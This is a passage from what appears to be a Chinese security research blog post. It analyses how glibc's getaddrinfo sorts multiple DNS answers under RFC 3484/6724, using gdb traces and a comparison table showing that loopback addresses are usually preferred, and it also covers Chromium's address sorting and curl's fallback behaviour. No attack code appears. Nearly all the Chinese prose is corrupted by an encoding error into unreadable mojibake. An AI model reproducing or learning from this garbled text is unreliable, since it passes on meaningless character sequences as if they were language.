class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* We got all the source addresses we can get, now sort using</span></span><br><span class="line"><span class="hljs-comment">   the information.  */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sort_result_combo</span> <span class="hljs-title">src</span></span></span><br><span class="line"><span class="hljs-class">  = {</span> .results = results, .nresults = nresults };</span><br><span class="line"><span class="hljs-keyword">if</span> (__glibc_unlikely (gaiconf_reload_flag_ever_set))</span><br><span class="line">  {</span><br><span class="line">    __libc_lock_define_initialized (<span class="hljs-keyword">static</span>, lock);</span><br><span class="line">    __libc_lock_lock (lock);</span><br><span class="line">    <span class="hljs-keyword">if</span> (__libc_once_get (old_once) &amp;&amp; gaiconf_reload_flag)</span><br><span class="line">      gaiconf_reload ();</span><br><span class="line">    __qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br><span class="line">    __libc_lock_unlock (lock);</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-keyword">else</span></span><br><span class="line">  __qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>rfc3484_sort</code>å‡½æ•°ä¸»è¦å®ç°å¯¹åº”äº† RFC 6742 å½“ä¸­çš„åæ¡è§„åˆ™ï¼š</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="line">rfc3484_sort (<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *p1, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *p2, <span class="hljs-keyword">void</span> *arg)</span><br><span class="line">{</span><br><span class="line">  <span class="hljs-comment">//...ä»£ç æ®µè¿‡é•¿è¿™é‡Œçœç•¥</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-comment">/* Rule 10: Otherwise, leave the order unchanged.  To ensure this</span></span><br><span class="line"><span class="hljs-comment">     compare with the value indicating the order in which the entries</span></span><br><span class="line"><span class="hljs-comment">     have been received from the services.  NB: no two entries can have</span></span><br><span class="line"><span class="hljs-comment">     the same order so the test will never return zero.  */</span></span><br><span class="line">  <span class="hljs-keyword">return</span> idx1 &lt; idx2 ? <span class="hljs-number">-1</span> : <span class="hljs-number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>rfc3484_sort</code>çš„å‡½æ•°æ‰§è¡Œå®Œåï¼Œå›è°ƒåˆ°<code>__qsort_r</code>ï¼Œä¹Ÿå°±æ˜¯<code>qsort_r</code></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __qsort_r qsort_r</span></span><br><span class="line"></span><br><span class="line">__qsort_r (order, nresults, <span class="hljs-keyword">sizeof</span> (order[<span class="hljs-number">0</span>]), rfc3484_sort, &amp;src);</span><br></pre></td></tr></tbody></table></figure><p></p><p>æ¥ç€æŸ¥é˜…æ‰‹å†Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <a href="https://linux.die.net/man/3/qsort_r" target="_blank" rel="noopener">qsort_r</a> å‡½æ•°çš„æè¿°ï¼š</p><blockquote><p><strong>Synopsis</strong></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">qsort</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> nmemb, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> (*compar)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *))</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">qsort_r</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *base, <span class="hljs-keyword">size_t</span> nmemb, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> (*compar)(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">void</span> *),</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">void</span> *arg)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p>Feature Test Macro Requirements for glibc (see <strong><a href="https://linux.die.net/man/7/feature_test_macros" target="_blank" rel="noopener">feature_test_macros</a></strong>(7)):</p><ul><li><strong>qsort_r</strong>(): _GNU_SOURCE</li></ul><p><strong>Description</strong></p><p>The <strong>qsort</strong>() function sorts an array with <em>nmemb</em> elements of size <em>size</em>. The <em>base</em> argument points to the start of the array.</p><p>The contents of the array are sorted in ascending order according to a comparison function pointed to by <em>compar</em>, which is called with two arguments that point to the objects being compared.</p><p>The comparison function must return an integer less than, equal to, or greater than zero if the first argument is considered to be respectively less than, equal to, or greater than the second. If two members compare as equal, their order in the sorted array is undefined.</p><p>The <strong>qsort_r</strong>() function is identical to <strong>qsort</strong>() except that the comparison function <em>compar</em> takes a third argument. A pointer is passed to the comparison function via <em>arg</em>. In this way, the comparison function does not need to use global variables to pass through arbitrary arguments, and is therefore reentrant and safe to use in threads.</p></blockquote><p>ä»ä¸­æˆ‘ä»¬å¯ä»¥æ˜ç™½ï¼Œ<code>qsort_r</code> å‡½æ•°æ˜¯è¿”å›å‡åºçš„æ•°ç»„ç»“æœï¼Œå¹¶ä¸”å¯¹äºä½¿ç”¨çš„æ¯”è¾ƒå‡½æ•°çš„è¿”å›å€¼æ˜¯å¦å¤§äºé›¶æ¥å†³å®šä¼ é€’çš„å‚æ•°å¤§å°ï¼Œå¦‚æœè¿”å›å€¼å¤§äºé›¶ï¼Œæ„æ€å°±æ˜¯ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æ’åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¹‹åã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å…·ä½“æ¥è°ƒè¯•ä¸€ä¸‹è¿™ä¸ªå‡½æ•°å§ï¼ŒæœŸé—´ setup ç­‰è°ƒè¯• glibc å¹¶éæœ¬æ–‡èŒƒå›´ï¼Œè€Œä¸”ç½‘ç»œä¹Ÿæœ‰æ¯”è¾ƒå¤šçš„æ–‡ç« ï¼Œè¿™é‡Œå°±ä¸å†åšè®°å½•ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä»¥ä¸€ä¸ª A è®°å½•ä¸º 127.0.0.1 ï¼Œå¦ä¸€ä¸ª A è®°å½•ä¸ºæˆ‘å…¶ä¸­ä¸€ä¸ª VPS åœ°å€ä¸ºä¾‹å­ï¼Œå…·ä½“æ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„ä¸»è¦åˆ¤æ–­å½¢å¼ã€‚ gbd ç›´æ¥ä¸‹æ–­ç‚¹åˆ°<code>rfc3484_sort</code>ï¼Œåœ¨è¿›å…¥åˆ°å‡½æ•°åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å½¢å¼æŸ¥çœ‹ç›¸åº”çš„åœ°å€ï¼š</p><p></p><figure class="highlight livescript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-params">(gdb)</span> <span class="hljs-title">p</span> <span class="hljs-params">((struct sockaddr_in*)((*a1-&gt;dest_addr)-&gt;ai_addr))</span>-&gt;</span>sin_addr</span><br><span class="line">$<span class="hljs-number">3</span> = {s_addr = <span class="hljs-number">3183758381</span>}</span><br><span class="line"><span class="hljs-function"><span class="hljs-params">(gdb)</span> <span class="hljs-title">p</span> <span class="hljs-params">((struct sockaddr_in*)((*a2-&gt;dest_addr)-&gt;ai_addr))</span>-&gt;</span>sin_addr</span><br><span class="line">$<span class="hljs-number">4</span> = {s_addr = <span class="hljs-number">16777343</span>}</span><br></pre></td></tr></tbody></table></figure><p></p><p>å¾—åˆ° a1 ä¸ a2 ä»£è¡¨çš„åœ°å€åï¼Œè½¬æˆåè¿›åˆ¶åå†å€’å™ä¸€ä¸‹ï¼Œå³ a2 ä»£è¡¨çš„æ˜¯ 127.0.0.1 ï¼Œ a1 ä»£è¡¨çš„æ˜¯æˆ‘ä»¬çœŸæ­£ vps çš„åœ°å€ã€‚ç„¶åé€šè¿‡ gdb å•æ­¥æ‰§è¡Œï¼Œæˆ‘ä»¬åœ¨ Rule 8 çš„æ—¶å€™è·³å‡ºäº†<code>rfc3484_sort</code>å‡½æ•°:</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* Rule 8: Prefer smaller scope.  */</span></span><br><span class="line"><span class="hljs-keyword">if</span> (a1_dst_scope &lt; a2_dst_scope)</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;</span><br><span class="line"><span class="hljs-keyword">if</span> (a1_dst_scope &gt; a2_dst_scope)</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part3/1.png" alt=""></p><p>è·³å‡º<code>rfc3484_sort</code>è¿›å…¥åˆ° <code>qsort_r</code> å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åœ¨æ­¤å¤„æ‰§è¡Œå®Œæ¯”è¾ƒå°±ç›´æ¥è¿”å›åˆ°äº†<code>qsort</code>å‡½æ•°ï¼Œå¹¶ä¸”ä»æ‰§è¡Œç»“æœæ¥çœ‹ï¼Œæ˜¯å› ä¸º <code>a1_dst_scope &gt; a2_dst_scope</code> æ¯”è¾ƒç»“æœæ‰§è¡Œäº†<code>return 1</code>ã€‚æ‰€ä»¥æŒ‰ç…§<code>qsort</code>å‡½æ•°æ–‡æ¡£è¯´æ˜ï¼Œå¦‚æœè¿”å›äº†ä¸€ä¸ªå¤§äº 0 çš„å€¼ï¼Œåˆ™è¯´æ˜è¦å°†ç¬¬ä¸€ä¸ªå‚æ•°éœ€è¦æ’åœ¨ç¬¬äºŒä¸ªå‚æ•°ä¹‹åï¼Œè¿™é‡Œ a1 ä»£è¡¨çš„æˆ‘ä»¬çš„ vps åœ°å€éœ€è¦æ’åœ¨ a2 ä»£è¡¨çš„ 127.0.0.1 åœ°å€ä¹‹åï¼Œæ‰€ä»¥ç»è¿‡<code>rfc3484_sort</code>å‡½æ•°è¿”å›çš„é¡ºåºåˆ™æ˜¯ 127.0.0.1 ä½œä¸ºé¦–é€‰åœ°å€ï¼ŒVPS åœ°å€å…¶æ¬¡ã€‚</p><p>äºæ˜¯æˆ‘æ¥ä¸‹æ¥ä¾æ¬¡å¯¹ IPv4 å½“ä¸­å„ç§æ’åˆ—ç»„åˆè¿›è¡Œäº†æµ‹è¯•ï¼š</p><ul><li><p>a1 127.0.0.1 vs a2 0.0.0.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ127 ä¼˜å…ˆ</p></li><li><p>a1 ipv4 vps vs a2 0.0.0.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œipv4 vps ä¼˜å…ˆ</p></li><li><p>a1  169.254.1.1 vs a2 0.0.0.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ169 ä¼˜å…ˆ</p></li><li><p>a1 127.0.0.1 vs a2 169.254.0ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ127 ä¼˜å…ˆ</p></li><li><p>a1 ipv4 vps vs a2 ipv4 vpsã€‚å¹¶ä¸é€‚ç”¨ä»»ä½•åˆ¤æ–­ï¼Œå‡½æ•°æ‰§è¡Œå®Œæˆè¿”å› -1 ï¼Œè¡¨ç¤ºä¿æŒåŸé¡ºåºï¼Œä½“ç°ä¸ºéšæœºã€‚</p></li></ul><p><strong>å†æ¬¡é‡ç”³ï¼Œè¿™é‡Œçš„ IPv6 æŒ‡çš„æ˜¯IPv4-mapped IPv6 addresses è¿™ç±»åœ°å€</strong></p><p>å¯¹äº IPv6 æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å½¢å¼åœ¨ gdb æ‰“å°å¯¹åº”çš„åœ°å€ï¼š</p><p></p><figure class="highlight xl hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-title">p</span> ((struct sockaddr_in6*)((*a1-&gt;</span><span class="hljs-function"><span class="hljs-title">dest_addr</span>)-&gt;</span><span class="hljs-function"><span class="hljs-title">ai_addr</span>))-&gt;</span><span class="hljs-function"><span class="hljs-title">sin6_addr</span>-&gt;</span>__<span class="hljs-function"><span class="hljs-title">in6_u</span>-&gt;</span>__u6_addr8</span><br></pre></td></tr></tbody></table></figure><p></p><p>äºæ˜¯æˆ‘æ¥ä¸‹æ¥ä¾æ¬¡å¯¹ IPv4 ä¸ IPv6 å½“ä¸­å„ç§æ’åˆ—ç»„åˆè¿›è¡Œäº†æµ‹è¯•ï¼š</p><ul><li>IPv6 vps vs IPv4 vpsã€‚å¹¶ä¸é€‚ç”¨ä»»ä½•åˆ¤æ–­ï¼Œå‡½æ•°æ‰§è¡Œå®Œæˆè¿”å› -1 ï¼Œè¡¨ç¤ºä¿æŒåŸé¡ºåºï¼Œä½“ç°ä¸ºéšæœºã€‚</li><li>IPv6 vps vs 127.0.0.1ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ127 ä¼˜å…ˆ</li><li>::1 vs 45.76.196.189ã€‚é€‚ç”¨äº prec åˆ¤æ–­ï¼Œ::1 ä¼˜å…ˆ</li><li>::1 vs 127.0.0.1ã€‚é€‚ç”¨äº prec åˆ¤æ–­ï¼Œ::1 ä¼˜å…ˆ</li><li>127.0.0.1 vs :: ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ :: ä¼˜å…ˆ</li><li>0.0.0.0 vs IPv6 vpsã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ IPv6 VPS ä¼˜å…ˆã€‚</li><li>0.0.0.0 vs  ::1ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼Œ::1 ä¼˜å…ˆ</li><li>IPv4 vps vs ::ã€‚é€‚ç”¨äº scope åˆ¤æ–­ï¼ŒIPv4 vps ä¼˜å…ˆ</li><li>IPv4 vps vs ::1ã€‚é€‚ç”¨äº price åˆ¤æ–­ï¼Œ ::1 ä¼˜å…ˆ</li></ul><p>æ€»ç»“èµ·æ¥æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä»¥ä¸‹è¿™ä¸ªè¡¨æ ¼ï¼š</p><table><thead><tr><th>å¯¹æ¯”å½¢å¼</th><th>A1</th><th>A2</th><th>ä¼˜å…ˆå€¼</th></tr></thead><tbody><tr><td>v4127-v40</td><td>127.0.0.1</td><td>0.0.0.0</td><td>A1</td></tr><tr><td>v4vps-v40</td><td>vps</td><td>0.0.0.0</td><td>A1</td></tr><tr><td>v4vps-v4127</td><td>127.0.0.1</td><td>vps</td><td>A1</td></tr><tr><td>v4vps-v4vps</td><td>vps</td><td>vps</td><td>éšæœºï¼Œä¿æŒåŸé¡ºåº</td></tr><tr><td>v4vps-v6vps</td><td>vps</td><td>vps</td><td>éšæœºï¼Œä¿æŒåŸé¡ºåº</td></tr><tr><td>v4127-v6vps</td><td>127.0.0.1</td><td>vps</td><td>A1</td></tr><tr><td>v4127-v60</td><td>127.0.0.1</td><td>::</td><td>A1</td></tr><tr><td>v4127-v6127</td><td>127.0.0.1</td><td>::1</td><td>A2</td></tr><tr><td>v40-v6vps</td><td>0.0.0.0</td><td>vps</td><td>A2</td></tr><tr><td>v40-v6127</td><td>0.0.0.0</td><td>::1</td><td>A2</td></tr><tr><td>v4vps-v6127</td><td>vps</td><td>::1</td><td>A2</td></tr><tr><td>v4vps-v60</td><td>vps</td><td>::</td><td>A1</td></tr><tr><td>V4127map-v4ps</td><td>vps</td><td>::ffff:7f00:0001</td><td>éšæœºï¼Œä¿æŒåŸé¡ºåº</td></tr></tbody></table><p>æ•´ä½“æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å¤§è‡´ä»è¡¨ä¸­çœ‹å‡ºï¼Œå«æœ‰åŒ A è®°å½•çš„æƒ…å†µï¼Œå¦‚æœå‡ºç° 127.0.0.1 æˆ–è€… ::1 ï¼Œéƒ½ä¼šä»¥è¿™ä¸¤è€…ä¼˜å…ˆï¼Œè€Œä¸¤è€…ä¸­åˆä¼šä»¥ ::1 ä¼˜å…ˆï¼Œæ‰€ä»¥å¯¹äºå‰æ–‡çš„ IP é€‰æ‹©æ’åºé—®é¢˜æˆ‘ä»¬è¿™é‡Œä¹Ÿå°±å¾—åˆ°äº†ä¸€ä¸ªå¤§ä½“çš„ç­”æ¡ˆã€‚</p><blockquote class="colorquote success"><p>2021/05/14 æ›´æ–°ï¼š</p><p>å¢åŠ äº† 127.0.0.1 ä½¿ç”¨ IPv4-mapped è¡¨ç¤º IPv6 æ—¶ï¼Œä¸ v4 vps åœ°å€çš„å¯¹æ¯”ï¼Œè¯¦ç»†è¯´æ˜è§ <a href="#IPv4-Mapped-127-0-0-1">Additional Remarks</a></p></blockquote><h3 id="IP-Sort-IN-Chromium"><a href="#IP-Sort-IN-Chromium" class="headerlink" title="IP Sort IN Chromium"></a>IP Sort IN Chromium</h3><p>å½“ç„¶åœ¨ Chromium ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ç›¸åº”çš„ IP é€‰æ‹©å®ç°æ–¹å¼ï¼š</p><p><a href="https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39" target="_blank" rel="noopener">https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=39</a></p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Address sorting is performed according to RFC3484 with revisions.</span></span><br><span class="line"><span class="hljs-comment">// http://tools.ietf.org/html/draft-ietf-6man-rfc3484bis-06</span></span><br><span class="line"><span class="hljs-comment">// Precedence and label are separate to support override through /etc/gai.conf.</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Returns true if |p1| should precede |p2| in the table.</span></span><br><span class="line"><span class="hljs-comment">// Sorts table by decreasing prefix size to allow longest prefix matching.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ComparePolicy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> AddressSorterPosix::PolicyEntry&amp; p1,</span></span></span><br><span class="line"><span class="hljs-function"><span class="hljs-params">                   <span class="hljs-keyword">const</span> AddressSorterPosix::PolicyEntry&amp; p2)</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> p1.prefix_length &gt; p2.prefix_length;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>åœ¨ <a href="https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200" target="_blank" rel="noopener">https://source.chromium.org/chromium/chromium/src/+/master:net/dns/address_sorter_posix.cc;l=200</a> ä¹Ÿå®ç°äº†åŸºäº RFC 3484 å¯¹åº”çš„ IP æ’åºæ–¹æ³•ã€‚</p><p>ä½†æ˜¯å®é™…æµ‹è¯•ä¸­ï¼Œ chrome æœ‰ä¸ªéå¸¸å¥‡ç‰¹çš„ç°è±¡ï¼Œå°±æ˜¯å¯¹äºè¿”å›å¤šä¸ª IP ï¼Œchrome ä¼šç«‹é©¬æŒ¨ä¸ªå¯¹å…¶å‘èµ·è¯·æ±‚ï¼Œæˆ‘æ‰¾äº†ä¸€äº›æœ‹å‹è¯¢é—®äº†ç›¸å…³æƒ…å†µï¼Œæœ‰äº›è¡¨ç¤ºæ²¡æœ‰å…³æ³¨è¿‡ï¼Œæœ‰ä½æœ‹å‹åˆ™è¡¨ç¤ºä»–è¿‡å»å‘ç°è¿‡è¿™ä¸ªæƒ…å†µï¼Œè¯´æ˜¯ chrome æœ‰ä¸ª IP é€‰ä¼˜çš„æƒ…å†µï¼Œä¼šå¯¹å¤šä¸ª IP è¿›è¡Œæµ‹é€Ÿï¼Œä»¥æœ€å¿«çš„ç»“æœä½œä¸ºæœ€ä½³é€‰æ‹©ã€‚å…³äºè¿™ä¸ªç»“è®ºæˆ‘åœ¨ chromium.org ç­‰ç›¸å…³æ–‡æ¡£è¿›è¡Œäº†æŸ¥æ‰¾ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ‰¾åˆ°å…³äºè¯¥ç°è±¡çš„è¯´æ˜ã€‚å¦‚æœæœ‰æœ‹å‹çŸ¥é“è¯¥ç°è±¡çš„åŸå› æˆ–è€…ç›¸å…³ä¿¡æ¯çš„è¯ï¼Œä¹Ÿæ¬¢è¿æå‡ºè¯„è®ºã€‚</p><h3 id="Something-else"><a href="#Something-else" class="headerlink" title="Something else"></a>Something else</h3><h4 id="Bad-behaved-Application"><a href="#Bad-behaved-Application" class="headerlink" title="Bad-behaved Application"></a>Bad-behaved Application</h4><p>åœ¨ RFC 6724 å½“ä¸­ï¼Œæœ‰ç€è¿™ä¹ˆä¸€æ®µè¯</p><blockquote><p>â€‹    Well-behaved applications SHOULD NOT simply use the first address returned from an API such as getaddrinfo() and then give up if it fails. For many applications, it is appropriate to iterate through the list of addresses returned from getaddrinfo() until a working address is found. For other applications, it might be appropriate to try multiple addresses in parallel (e.g., with some small delay in between) and use the first one to succeed. </p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´åº”ç”¨ç¨‹åºä¸åº”è¯¥ç®€å•åœ°ä½¿ç”¨ä» APIï¼ˆå¦‚<code>getaddrinfo</code>ï¼‰è¿”å›çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼Œå¤±è´¥äº†å°±æ”¾å¼ƒæ”¹åœ°å€ã€‚å¯¹äºè®¸å¤šåº”ç”¨ç¨‹åºæ¥è¯´ï¼Œå®ƒä»¬éƒ½é€‰æ‹©ä»<code>getaddrinfo</code>è¿”å›çš„åœ°å€åˆ—è¡¨ä¸­è¿›è¡ŒæŒ¨ä¸ªæµ‹è¯•ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæ­£å¸¸çš„åœ°å€ã€‚å¯¹äºå…¶ä»–åº”ç”¨ç¨‹åºï¼Œå¯èƒ½é€‚åˆå¹¶è¡Œå°è¯•å¤šä¸ªåœ°å€ï¼ˆä¾‹å¦‚ï¼Œä¸­é—´æœ‰ä¸€äº›å°çš„å»¶è¿Ÿï¼‰ï¼Œå¹¶ä½¿ç”¨ç¬¬ä¸€ä¸ªåœ°å€æˆåŠŸã€‚(å¯èƒ½ Chrome å°±æ˜¯åŸºäºè¿™ä¸ªè¡¨ç°)</p><p>ç„¶è€Œ curl å°±æ˜¯è¿™ä¹ˆä¸€ä¸ª Bad-behaved Application ï¼Œä»<code>getaddrinfo</code>å‡½æ•°ä¸­å–å¾—çš„åœ°å€é“¾è¡¨ï¼Œä¾æ¬¡æŒ¨ä¸ªå»ºç«‹è¿æ¥ï¼Œä¸€ä¸ªä¸è¡Œå°±æ¢ä¸‹ä¸€ä¸ªç›´åˆ°æˆåŠŸæˆ–é“¾è¡¨ä¸ºç©ºä¸ºæ­¢ã€‚</p><h4 id="Some-History-of-getaddrinfo"><a href="#Some-History-of-getaddrinfo" class="headerlink" title="Some History of getaddrinfo"></a>Some History of getaddrinfo</h4><p>ä¸€æ®µå…³äº getaddrinfo 